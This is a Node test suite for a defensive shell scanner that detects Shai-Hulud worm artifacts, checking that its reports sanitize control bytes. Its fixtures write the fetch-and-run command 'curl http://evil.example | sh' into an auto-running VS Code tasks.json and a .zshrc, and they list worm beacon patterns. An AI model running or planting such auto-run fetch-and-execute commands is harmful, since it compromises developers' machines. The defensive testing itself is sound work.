'use strict';

// Behavioural (black-box) tests for scripts/scan-shai-hulud-may2026.sh's report
// integrity (SCAN-01, G-1549, phase 19 plan 19-04).
//
// This scanner has 4 of the phase's 7 counted `printf "%b"` sites: the
// fail()/reprint path (site ~589), the two hit-list print sites at ~350
// (shell-rc section) and ~377 (shell-history section), and the SCAN-02
// control-flow loop at ~190 (FOLDEROPEN_FILES) -- that fourth site is NOT
// this plan's; it is fixed separately by 19-06-PLAN.md.
//
// This file is also the one real test-environment hazard in the phase:
// lines ~549-573 fire an UNGATED `gh repo list --limit 200` whenever `gh` is
// installed and authenticated -- true on the maintainer's own machine by
// this project's convention. Ticket G-1630 owns adding an LSH_NO_NETWORK
// guard to that block in the SCRIPT itself and is deliberately NOT
// implemented here. Every test in this file instead routes through the
// single `run()` helper below, which injects `tests/helpers/
// chaindrop-fixtures.js`'s two-level sentinel `gh` stub onto PATH ahead of
// any real `gh` on the runner's PATH -- so this suite is deterministic and
// network-free WITHOUT depending on G-1630 and without folding G-1630's fix
// into this phase. The stub's load-bearingness is proven in Task 3 by
// SWAPPING its mode to 'authenticated-tripwire', never by removing it --
// removing it is exactly what would make a real `gh repo list --limit 200`
// call on an authenticated workstation and leak the operator's own
// repository names into test output (review R1-7, the phase-wide
// prohibition on live network calls from tests).
//
// Shared fixture helpers (SEARCH_ROOT_NAMES, HOSTILE_NAMES, writeHostile,
// ghStub, newHome, runScanner) come from tests/helpers/chaindrop-fixtures.js
// per 19-01's tracer precedent (19-CONTEXT.md D-16) -- reused unchanged,
// never forked. A local `writeHostileDir` mirrors chaindrop-scanner.test.js's
// own local helper (that helper writes a hostile FILE; several cases here
// need a hostile ANCESTOR DIRECTORY instead, since the .vscode/tasks.json
// leaf filename is always the fixed literal "tasks.json").
//
// Negative byte-presence assertions use Buffer.includes() over the whole
// captured stdout, never the session `grep` shim (ugrep -I, which silently
// skips NUL-bearing files and exits 1 indistinguishable from "no match" --
// it has already produced one false PASS on this repo).
//
// --- Two Rule 1 (auto-fix bug) deviations from the plan, found during
// authoring, both empirically verified by running the REAL, unmodified
// scanner (recorded verbatim in this plan's execution session; also see
// 19-04-SUMMARY.md's Deviations section) -----------------------------------
//
// 1. DUPLICATE, UNSANITIZED FINDING_LOG APPEND (Section 2 tasks.json FAIL
//    branch). The worm-pattern FAIL branch calls `fail(...)`  (which now
//    sanitizes and appends ONE entry to FINDING_LOG) and THEN, on the very
//    next line, does a SECOND, hand-rolled, completely unsanitized append:
//    `FINDING_LOG="${FINDING_LOG}  - VSCode tasks.json worm-pattern
//    folderOpen: $f\n"`. Empirically confirmed pre-fix: a single worm-pattern
//    tasks.json produces 1 live "[FAIL]" line but 2 "  - " reprint lines for
//    the SAME event -- and the second one carries the raw, unsanitized path
//    with the OLD 2-char "\n" separator. This directly breaks this plan's own
//    must_haves truth ("the reprint '  - ' count equals the live '[FAIL]'
//    count") and leaves this exact site forgeable even after fail() itself is
//    fixed. Task 2 removes the redundant manual append (fail()'s own append
//    already records an equivalent, now-sanitized entry). This edit lands on
//    a line inside the plan's stated "do not touch lines 155-195" zone
//    (which the plan's <objective> text scopes to the SCAN-02 control-flow
//    site at line ~190 and the FOLDEROPEN_FILES accumulator at ~162-167
//    specifically, not to every line in that numeric range) -- documented at
//    length in 19-04-SUMMARY.md rather than silently worked around.
//
// 2. MUST-STILL-PASS (backslash-c) VEHICLE MOVED OFF THE TASKS.JSON SITE.
//    The obvious vehicle for "a path carrying a literal backslash-c must not
//    truncate the reprint" is the same tasks.json fixture used for the ESC
//    case above -- but empirically verified NOT to work: Section 2's OWN
//    control-flow re-parse at line ~190, `done < <(printf "%b"
//    "$FOLDEROPEN_FILES")`, is itself `%b`-driven (the SCAN-02 site this
//    plan's <objective> explicitly excludes, owned by 19-06-PLAN.md). A path
//    containing literal `\c` triggers `%b`'s "stop all further output"
//    behaviour THERE FIRST, before the file is ever read by that loop --
//    fail() is never even called for it. Confirmed by direct empirical run
//    (this plan's execution session): with a `\c`-named tasks.json, only the
//    OTHER (control) tasks.json's fail() fires; the poisoned one silently
//    vanishes upstream of fail() entirely, which would make a truncation
//    assertion here fail for a completely different, out-of-scope reason.
//    The corrected vehicle instead uses Section 1's LaunchAgent 'kitty'
//    check, which reads its `grep -lir` output via a plain here-string
//    (`<<< "$KITTY_LA"`, no `%b` anywhere in its control flow) -- verified
//    empirically that BOTH LaunchAgent files' live [FAIL] lines print
//    correctly regardless of the `\c` byte, and the truncation only occurs
//    at the actual target of this plan's fix: the FINDING_LOG reprint itself
//    (`printf "%b" "$FINDING_LOG"`, site ~589). This is the right site for a
//    must-still-pass twin of the reprint fix; the tasks.json site's own
//    upstream `%b` contamination is 19-06-PLAN.md's problem, not this one's.
//
// 3. INFO-PATH VEHICLE CORRECTED FROM CONTENT TO PATH. The plan's Task 1
//    <behavior> text describes an "info-path case" where "matched command
//    text... contains a real 0x1B" and expects "the info line" to have zero
//    raw 0x1B bytes. Empirically verified (see this plan's execution
//    session): Section 2's info() branch calls `info(... "$f")` with ONLY the
//    file PATH as $1 -- the matched command TEXT is printed by a completely
//    separate, un-helpered `grep -oE ... | sed 's/^/         /'` pipe that
//    NEVER goes through info() at all. That raw pipe is one of this file's
//    five direct content-print sites this plan's <objective> explicitly
//    defers to 19-10-PLAN.md (same class as the FAIL branch's "Matched
//    commands:" dump). Using command-text-borne ESC as this case's vehicle
//    would make "the info line has zero raw ESC bytes" trivially true
//    pre-fix (info() never had the byte to begin with) while the STDOUT-WIDE
//    claim would be structurally unwinnable by Task 2's fix (out of scope,
//    deferred). The vehicle below instead puts the ESC in the tasks.json's
//    own PATH (an ancestor directory name) with a BENIGN, non-worm command
//    text -- this is exactly what info()'s own $1 argument actually is, so
//    it correctly discriminates info()'s sanitize-at-entry fix (break-proof 3
//    removes only info()'s capture and this case is the one that fails).

const { describe, it, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const { write, newHome, runScanner, hasBash, SEARCH_ROOT_NAMES, HOSTILE_NAMES, writeHostile, ghStub } = require('./helpers/chaindrop-fixtures.js');

const SCRIPT = path.join(__dirname, '..', 'scripts', 'scan-shai-hulud-may2026.sh');

// shai-hulud has NO environment override for its scan roots (unlike
// chaindrop's LSH_ROOTS) -- every fixture below nests under
// SEARCH_ROOT_NAMES.shaiHulud's first entry ('Projects'), matching
// scripts/scan-shai-hulud-may2026.sh:146's hardcoded list.
const SHAI_HULUD_ROOT = SEARCH_ROOT_NAMES.shaiHulud[0];

// Directory-write counterpart to chaindrop-fixtures.js's writeHostile() --
// that helper writes a FILE named `name`; several cases here need the
// hostile byte in an ANCESTOR directory (the .vscode/tasks.json leaf
// filename is always the fixed literal string "tasks.json"). Mirrors
// tests/chaindrop-scanner.test.js's own local writeHostileDir exactly
// (control-code-point presence + NFC-normalized match, the same
// verification writeHostile() itself does for files).
function writeHostileDir(parentAbs, name) {
  fs.mkdirSync(parentAbs, { recursive: true });
  fs.mkdirSync(path.join(parentAbs, name), { recursive: true });
  const entries = fs.readdirSync(parentAbs);
  const controlChars = [...name].filter((ch) => {
    const cp = ch.codePointAt(0);
    return cp <= 0x1f || (cp >= 0x7f && cp <= 0x9f) || cp === 0x202e;
  });
  const match = entries.find((entry) => {
    const hasAllControls = controlChars.every((ch) => entry.includes(ch));
    const nfcMatches = entry.normalize('NFC') === name.normalize('NFC');
    return hasAllControls && nfcMatches;
  });
  if (!match) {
    throw new Error(
      'writeHostileDir: on-disk entry did not preserve the hostile name.\n' +
        `  wrote (hex): ${Buffer.from(name, 'utf8').toString('hex')}\n` +
        `  found (hex): ${entries.map((e) => Buffer.from(e, 'utf8').toString('hex')).join(', ')}`
    );
  }
  return path.join(parentAbs, match);
}

// Single stub-injecting helper every test routes through (acceptance
// criterion: exactly ONE call to runScanner( in this whole file, inside this
// function). Defaults to the network-free 'unauthenticated' gh stub mode;
// Task 3's break-proof 4 swaps stubMode to 'authenticated-tripwire' to prove
// the stub is load-bearing WITHOUT ever removing it (review R1-7). Every
// case runs under a hostile ambient locale (LANG=C, LC_ALL=C), matching
// review R1-1's precedent carried into every scanner test file this phase
// adds -- proves the sanitizer forces its OWN locale rather than depending
// on the caller's environment.
function run(built, home, opts = {}) {
  const { stubMode = 'unauthenticated', extraEnv = {} } = opts;
  const { dir, sentinelLog } = ghStub(built, stubMode);
  const res = runScanner(
    home,
    { LANG: 'C', LC_ALL: 'C', PATH: `${dir}:${process.env.PATH}`, ...extraEnv },
    SCRIPT
  );
  return { res, sentinelLog };
}

// ---------------------------------------------------------------------------
// Section 4 (shell rc injection, site ~350) source extraction -- read the
// heredoc-tag ERE pattern out of the script rather than retyping it, so this
// fixture cannot silently stop matching if the literal ever changes.
function readHeredocPattern() {
  const src = fs.readFileSync(SCRIPT, 'utf8');
  const m = src.match(/HEREDOC=\$\(grep -nE '([^']+)' "\$rc"/);
  assert.ok(m, 'could not extract the heredoc-tag ERE pattern from scripts/scan-shai-hulud-may2026.sh');
  return m[1];
}

// Read a bash array literal ('a' 'b' 'c') out of the script source, handling
// both the multi-line (VAR=(\n 'x'\n 'y'\n)) and single-line (VAR=('x' 'y'))
// forms this file actually uses. Non-vacuous: throws loudly if extraction
// finds nothing, rather than silently returning an empty array a later .find
// would iterate zero times over.
function readBashArrayLiteral(varName) {
  const src = fs.readFileSync(SCRIPT, 'utf8');
  let m = src.match(new RegExp(`${varName}=\\(\\n([\\s\\S]*?)\\n\\)`, 'm'));
  if (!m) {
    m = src.match(new RegExp(`${varName}=\\(([^\\n]*)\\)`, 'm'));
  }
  assert.ok(m, `could not extract ${varName} array literal from scripts/scan-shai-hulud-may2026.sh`);
  const items = [...m[1].matchAll(/'([^']*)'/g)].map((x) => x[1]);
  assert.ok(items.length > 0, `extraction produced ZERO ${varName} entries -- regex or source drifted`);
  return items;
}

const HEREDOC_PATTERN = readHeredocPattern();
const RC_BAD_PATTERNS = readBashArrayLiteral('RC_BAD_PATTERNS');
const HIST_PATTERNS = readBashArrayLiteral('HIST_PATTERNS');

// Non-vacuity: assert the specific literals this file's fixtures depend on
// are still present in the extracted sets, BEFORE using them.
assert.ok(RC_BAD_PATTERNS.includes('kitty.*monitor'), `RC_BAD_PATTERNS no longer contains 'kitty.*monitor': ${JSON.stringify(RC_BAD_PATTERNS)}`);
assert.ok(RC_BAD_PATTERNS.includes('m-kosche'), `RC_BAD_PATTERNS no longer contains 'm-kosche': ${JSON.stringify(RC_BAD_PATTERNS)}`);
assert.ok(HIST_PATTERNS.includes('m-kosche'), `HIST_PATTERNS no longer contains 'm-kosche': ${JSON.stringify(HIST_PATTERNS)}`);
assert.ok(HIST_PATTERNS.includes('kitty-monitor'), `HIST_PATTERNS no longer contains 'kitty-monitor': ${JSON.stringify(HIST_PATTERNS)}`);

// Build a text line that satisfies a given ERE pattern, verifying the match
// with a real JS RegExp constructed FROM the extracted pattern text (not a
// hand-typed guess) before returning -- so the fixture is provably matching,
// not assumed to be.
function buildMatchingLine(erePattern, candidate) {
  const re = new RegExp(erePattern);
  assert.ok(re.test(candidate), `candidate "${candidate}" does not satisfy extracted pattern /${erePattern}/`);
  return candidate;
}

const HEREDOC_CANDIDATE = buildMatchingLine(HEREDOC_PATTERN, '<<ABCDEFGH1');

const WORM_COMMAND = 'curl http://evil.example | sh';
const BENIGN_COMMAND = 'npm run dev';

function tasksJsonContent(command) {
  return JSON.stringify(
    { version: '2.0.0', tasks: [{ label: 'x', type: 'shell', command, runOptions: { runOn: 'folderOpen' } }] },
    null,
    2
  );
}

// Build `<home>/Projects/x/<dirName>/.vscode/tasks.json` with the given
// command, returning the absolute tasks.json path (writeHostileDir handles
// the on-disk verification when dirName carries hostile bytes; a plain
// fs.mkdirSync is equally correct for a benign dirName).
function buildTasksJsonUnder(home, dirName, command) {
  const parent = path.join(home, SHAI_HULUD_ROOT, 'x');
  fs.mkdirSync(parent, { recursive: true });
  const leafDir = writeHostileDir(parent, dirName);
  const vscodeDir = path.join(leafDir, '.vscode');
  fs.mkdirSync(vscodeDir, { recursive: true });
  const tasksPath = path.join(vscodeDir, 'tasks.json');
  fs.writeFileSync(tasksPath, tasksJsonContent(command));
  return tasksPath;
}

// ---------------------------------------------------------------------------
// Report-extraction helpers.

// Live "  [FAIL] " lines. Colour codes are gated on [ -t 1 ] and spawnSync
// gives the child no TTY, so a piped run emits no ANSI -- the literal
// two-space prefix is unambiguous.
function countFailLines(stdout) {
  const m = stdout.match(/^ {2}\[FAIL\] /gm);
  return m ? m.length : 0;
}

// The "Findings:" reprint block, bounded at its start by the literal
// "\nFindings:\n" marker and at its end by the next blank line (the script
// prints a bare "\n" then "What to do if FAIL:" immediately after the
// FINDING_LOG dump).
function extractFindingsBlock(stdout) {
  const marker = '\nFindings:\n';
  const idx = stdout.indexOf(marker);
  if (idx === -1) return '';
  const start = idx + marker.length;
  const nextBlank = stdout.indexOf('\n\n', start);
  return nextBlank === -1 ? stdout.slice(start) : stdout.slice(start, nextBlank);
}

function countReprintLines(stdout) {
  const block = extractFindingsBlock(stdout);
  const m = block.match(/^ {2}- /gm);
  return m ? m.length : 0;
}

function reprintLines(stdout) {
  return extractFindingsBlock(stdout)
    .split('\n')
    .filter((l) => l.length > 0);
}

// A specific section's hit-list dump, bounded by its own fail() message line
// (start) and the next section() header (end, marked by "\n\n==" -- fail's
// dump ends in a real newline and section() itself begins with a leading
// blank line).
function extractSectionHitBlock(stdout, failMarker) {
  const idx = stdout.indexOf(failMarker);
  assert.ok(idx !== -1, `FAIL marker "${failMarker}" not found in stdout\n${stdout}`);
  const lineEnd = stdout.indexOf('\n', idx);
  assert.ok(lineEnd !== -1, `FAIL marker line has no trailing newline\n${stdout}`);
  const dumpStart = lineEnd + 1;
  const nextSection = stdout.indexOf('\n\n==', dumpStart);
  const dumpEnd = nextSection === -1 ? stdout.length : nextSection;
  return stdout.slice(dumpStart, dumpEnd);
}

function extractRcHitBlock(stdout) {
  return extractSectionHitBlock(stdout, 'Suspicious patterns in');
}

function extractHistHitBlock(stdout) {
  return extractSectionHitBlock(stdout, 'Beacon strings in');
}

describe('scan-shai-hulud-may2026.sh -- report integrity, fail()/reprint + both hit-list sites (SCAN-01, G-1549)', { skip: !hasBash ? 'bash unavailable' : false }, () => {
  const built = [];
  after(() => built.forEach((h) => fs.rmSync(h, { recursive: true, force: true })));

  it('rc-file hit-list (site ~350): a heredoc-tag line carrying a real ESC is reported with U+FFFD and zero raw ESC bytes; a benign sibling rc file is reported clean', () => {
    const home = newHome(built, (h, p) => {
      write(p('.zshrc'), `cat ${HEREDOC_CANDIDATE}${HOSTILE_NAMES.ESC}trap\n`);
      write(p('.bashrc'), '# a perfectly ordinary bashrc\nexport PATH="$PATH:/usr/local/bin"\n');
    });
    const { res } = run(built, home);
    assert.equal(res.status, 1, res.stdout);
    assert.ok(res.stdout.includes('.bashrc clean'), `expected the benign sibling .bashrc to be reported clean\n${res.stdout}`);
    assert.ok(!Buffer.from(res.stdout, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached stdout\n${JSON.stringify(res.stdout)}`);
    assert.ok(res.stdout.includes('�'), `expected U+FFFD replacement in the rc hit-list block\n${JSON.stringify(res.stdout)}`);
    const failCount = countFailLines(res.stdout);
    const reprintCount = countReprintLines(res.stdout);
    assert.equal(failCount, reprintCount, `live [FAIL] count (${failCount}) vs reprint "  - " count (${reprintCount})\n${res.stdout}`);
  });

  it('shell-history hit-list (site ~377): a beacon-literal line carrying a real ESC is reported with U+FFFD and zero raw ESC bytes; a benign sibling history file is reported clean', () => {
    const home = newHome(built, (h, p) => {
      write(p('.zsh_history'), `echo visiting m-kosche${HOSTILE_NAMES.ESC} now\n`);
      write(p('.bash_history'), 'echo hello world\n');
    });
    const { res } = run(built, home);
    assert.equal(res.status, 1, res.stdout);
    assert.ok(res.stdout.includes('.bash_history clean'), `expected the benign sibling .bash_history to be reported clean\n${res.stdout}`);
    assert.ok(!Buffer.from(res.stdout, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached stdout\n${JSON.stringify(res.stdout)}`);
    assert.ok(res.stdout.includes('�'), `expected U+FFFD replacement in the history hit-list block\n${JSON.stringify(res.stdout)}`);
    const failCount = countFailLines(res.stdout);
    const reprintCount = countReprintLines(res.stdout);
    assert.equal(failCount, reprintCount, `live [FAIL] count (${failCount}) vs reprint "  - " count (${reprintCount})\n${res.stdout}`);
  });

  it('both hit-list blocks preserve their sed \'s/^/      /\' six-space indentation on a benign multi-match fixture', () => {
    const home = newHome(built, (h, p) => {
      write(p('.zshrc'), 'echo kitty is a friendly monitor in this line\necho totally unrelated m-kosche mention\n');
      write(p('.zsh_history'), 'echo saw m-kosche mentioned\necho kitty-monitor referenced here\n');
    });
    const { res } = run(built, home);
    assert.equal(res.status, 1, res.stdout);
    const rcBlock = extractRcHitBlock(res.stdout);
    const histBlock = extractHistHitBlock(res.stdout);
    for (const [label, block] of [['rc', rcBlock], ['history', histBlock]]) {
      const hitLines = block.split('\n').filter((l) => /^\s*\d+:/.test(l));
      assert.ok(hitLines.length >= 2, `expected at least 2 numbered hit lines in the ${label} block\n${JSON.stringify(block)}`);
      for (const l of hitLines) {
        assert.ok(/^ {6}\d+:/.test(l), `expected exactly six leading spaces before the matched line number in the ${label} block\n${JSON.stringify(l)}`);
        assert.ok(!/^ {7}/.test(l), `found seven leading spaces (indentation drift) in the ${label} block\n${JSON.stringify(l)}`);
      }
    }
  });

  it('fail()/reprint path: a hostile-named tasks.json path (real ESC) with a worm-pattern command triggers FAIL, reprint carries U+FFFD with zero raw ESC bytes, live [FAIL] count equals reprint count, benign positive control also reported', () => {
    const home = newHome(built, () => {});
    const controlPath = buildTasksJsonUnder(home, 'control', WORM_COMMAND);
    buildTasksJsonUnder(home, `evil-${HOSTILE_NAMES.ESC}`, WORM_COMMAND);
    const { res } = run(built, home);
    assert.equal(res.status, 1, res.stdout);
    assert.ok(res.stdout.includes(controlPath), `missing benign control ${controlPath}\n${res.stdout}`);
    assert.ok(!Buffer.from(res.stdout, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached stdout\n${JSON.stringify(res.stdout)}`);
    assert.ok(res.stdout.includes('�'), `expected U+FFFD replacement in the reprint\n${JSON.stringify(res.stdout)}`);
    const failCount = countFailLines(res.stdout);
    const reprintCount = countReprintLines(res.stdout);
    assert.equal(failCount, reprintCount, `live [FAIL] count (${failCount}) vs reprint "  - " count (${reprintCount}) -- see this file's header comment on the duplicate FINDING_LOG append bug\n${res.stdout}`);
  });

  it('must-still-pass control (Rule 1 corrected vehicle -- see header comment): a LaunchAgent path carrying a literal backslash-c is NOT truncated -- reprint line complete through its final ".plist" suffix', () => {
    const home = newHome(built, () => {});
    const laDir = path.join(home, 'Library', 'LaunchAgents');
    fs.mkdirSync(laDir, { recursive: true });
    fs.writeFileSync(path.join(laDir, 'control.plist'), '<key>Label</key><string>kitty-thing</string>\n');
    const controlPath = path.join(laDir, 'control.plist');
    const hostilePath = writeHostile(laDir, `evil-${HOSTILE_NAMES.BS_C}.plist`, '<key>Label</key><string>kitty-thing</string>\n');
    const { res } = run(built, home);
    assert.equal(res.status, 1, res.stdout);
    assert.ok(res.stdout.includes(controlPath), `missing benign control ${controlPath}\n${res.stdout}`);
    const failCount = countFailLines(res.stdout);
    const reprintCount = countReprintLines(res.stdout);
    assert.equal(failCount, reprintCount, `live [FAIL] count (${failCount}) vs reprint "  - " count (${reprintCount})\n${res.stdout}`);
    const controlLine = `  - LaunchAgent references 'kitty': ${controlPath}`;
    const lines = reprintLines(res.stdout);
    const poisoned = lines.find((l) => l !== controlLine);
    assert.ok(poisoned, `no poisoned reprint line found\nlines: ${JSON.stringify(lines)}`);
    assert.ok(
      poisoned.trimEnd().endsWith('.plist'),
      `poisoned reprint line was truncated before its final suffix (this would be the %b-truncation bug)\n${JSON.stringify(poisoned)}\nhostilePath: ${hostilePath}`
    );
  });

  // Note (a third, smaller Rule 1 scoping correction, found while running
  // this case against the fix): the header block's `printf "Home: %s\n"
  // "$HOME"` line (well above pass()/fail()) is a raw, un-helpered print of
  // $HOME -- NOT one of pass()/fail()/warn()/info(), NOT a hit-list site, and
  // confirmed unfixed in the already-completed sibling scripts too (miasma,
  // g747 -- same header shape, same gap). It is out of this plan's stated
  // scope. A hostile HOME therefore still reaches that ONE header line raw;
  // the assertion below is scoped to the pass()/fail() lines this plan
  // actually fixes, not the whole stdout, so it does not depend on that
  // out-of-scope residual.
  it('pass()-path: an rc file with plainly-suspicious-looking but clean content, whose PATH (HOME dir name) carries a real ESC, is reported clean via pass() with zero raw ESC bytes on that line; a genuinely dirty sibling rc file still FAILs correctly via fail() with zero raw ESC bytes on that line too', () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'lsh-sh-pass-'));
    built.push(base);
    const homeAbs = writeHostileDir(base, `home-${HOSTILE_NAMES.ESC}`);
    fs.writeFileSync(path.join(homeAbs, '.bashrc'), '# reminder: never pipe curl output to bash, and never trust m kosche vendors\n');
    fs.writeFileSync(path.join(homeAbs, '.zshrc'), 'curl http://evil.example | sh\n');
    const { res } = run(built, homeAbs);
    assert.equal(res.status, 1, res.stdout); // .zshrc is genuinely dirty -> overall run still FAILs
    const passLine = res.stdout.split('\n').find((l) => l.includes('.bashrc clean'));
    assert.ok(passLine, `missing expected .bashrc clean pass line\n${res.stdout}`);
    assert.ok(!Buffer.from(passLine, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached the pass() line\n${JSON.stringify(passLine)}`);
    assert.ok(passLine.includes('�'), `expected U+FFFD replacement in the pass() line\n${JSON.stringify(passLine)}`);
    const failLine = res.stdout.split('\n').find((l) => l.includes('[FAIL] Suspicious patterns in'));
    assert.ok(failLine, `missing expected fail() line for the genuinely dirty .zshrc\n${res.stdout}`);
    assert.ok(!Buffer.from(failLine, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached the fail() line\n${JSON.stringify(failLine)}`);
    assert.ok(failLine.includes('�'), `expected U+FFFD replacement in the fail() line\n${JSON.stringify(failLine)}`);
  });

  // Rule 1 corrected vehicle -- see this file's header comment ("INFO-PATH
  // VEHICLE CORRECTED FROM CONTENT TO PATH"). info()'s own $1 argument in
  // Section 2's non-worm branch is the tasks.json's PATH, never the matched
  // command text (that raw dump bypasses every print helper and is deferred
  // to 19-10-PLAN.md) -- so this case puts the ESC in the path and keeps the
  // command text benign, which is what actually exercises info()'s
  // sanitize-at-entry fix.
  it('info()-path (Rule 1 corrected vehicle): a hostile-named tasks.json path (real ESC) with a benign, non-worm command triggers info(), zero raw ESC bytes in stdout, benign positive control also info-reported', () => {
    const home = newHome(built, () => {});
    const controlPath = buildTasksJsonUnder(home, 'control3', BENIGN_COMMAND);
    buildTasksJsonUnder(home, `evil-${HOSTILE_NAMES.ESC}`, BENIGN_COMMAND);
    const { res } = run(built, home);
    assert.equal(res.status, 0, res.stdout); // benign (non-worm) commands only -> no FAIL anywhere
    assert.ok(res.stdout.includes('tasks.json has runOn:folderOpen but commands look legitimate'), res.stdout);
    assert.ok(res.stdout.includes(controlPath), `missing benign control ${controlPath}\n${res.stdout}`);
    assert.ok(!Buffer.from(res.stdout, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached stdout via info()\n${JSON.stringify(res.stdout)}`);
    assert.ok(res.stdout.includes('�'), `expected U+FFFD replacement in the info line for the hostile path\n${JSON.stringify(res.stdout)}`);
  });

  it('network-free by construction: unauthenticated gh stub drives the installed-but-unauthenticated branch, records "auth status" but never reaches "repo list", and no dead-drop pattern output appears', () => {
    const home = newHome(built, () => {});
    const { res, sentinelLog } = run(built, home); // default stubMode: 'unauthenticated'
    assert.ok(res.stdout.includes('gh is installed but not authenticated'), res.stdout);
    assert.ok(!res.stdout.includes('Dead-drop pattern'), `unexpected dead-drop output despite an unauthenticated gh stub\n${res.stdout}`);
    const log = fs.readFileSync(sentinelLog, 'utf8');
    const invocations = log.split('\n').filter(Boolean);
    assert.ok(invocations.length > 0, 'sentinel log is empty -- gh was never invoked at all, so the zero-"repo list" claim would be vacuous');
    assert.ok(invocations.some((l) => l.startsWith('auth status')), `expected at least one "auth status" invocation in the sentinel log (positive control)\n${log}`);
    assert.ok(!invocations.some((l) => l.startsWith('repo list')), `unexpected "repo list" invocation -- the network guard was bypassed\n${log}`);
  });

  it('a clean fixture tree with zero findings exits 0, prints ALL CLEAR, and emits no Findings: block', () => {
    const home = newHome(built, (h, p) => {
      write(p(`${SHAI_HULUD_ROOT}/x/README.md`), '# hello\n');
    });
    const { res } = run(built, home);
    assert.equal(res.status, 0, res.stdout);
    assert.match(res.stdout, /ALL CLEAR/, res.stdout);
    assert.ok(!res.stdout.includes('Findings:'), `unexpected Findings: block on a clean tree\n${res.stdout}`);
  });
});

describe('shai-hulud source-level guard: printf "%b" occurrence count (4 pre-fix, 1 post-fix naming FOLDEROPEN_FILES)', () => {
  // Runs without a hasBash guard -- reading source text needs no bash.
  it('exactly 4 occurrences pre-fix, or exactly 1 post-fix and that survivor mentions FOLDEROPEN_FILES (the SCAN-02 control loop, fixed separately by 19-06-PLAN.md)', () => {
    const src = fs.readFileSync(SCRIPT, 'utf8');
    const re = /printf "%b"/g;
    const occurrences = [];
    let m;
    while ((m = re.exec(src)) !== null) {
      const lineStart = src.lastIndexOf('\n', m.index) + 1;
      const lineEnd = src.indexOf('\n', m.index);
      occurrences.push(src.slice(lineStart, lineEnd === -1 ? src.length : lineEnd));
    }
    assert.ok(occurrences.length > 0, 'extraction produced ZERO printf "%b" occurrences -- the regex or the file is broken, not "every site is already fixed"');
    if (occurrences.length > 1) {
      assert.equal(occurrences.length, 4, `expected exactly 4 printf "%b" occurrences pre-fix, found ${occurrences.length}: ${JSON.stringify(occurrences)}`);
    } else {
      assert.equal(occurrences.length, 1, `expected exactly 1 printf "%b" occurrence post-fix, found ${occurrences.length}: ${JSON.stringify(occurrences)}`);
      assert.ok(
        occurrences[0].includes('FOLDEROPEN_FILES'),
        `the single remaining printf "%b" occurrence must be the SCAN-02 control loop (FOLDEROPEN_FILES), found instead: ${JSON.stringify(occurrences[0])}`
      );
    }
  });
});
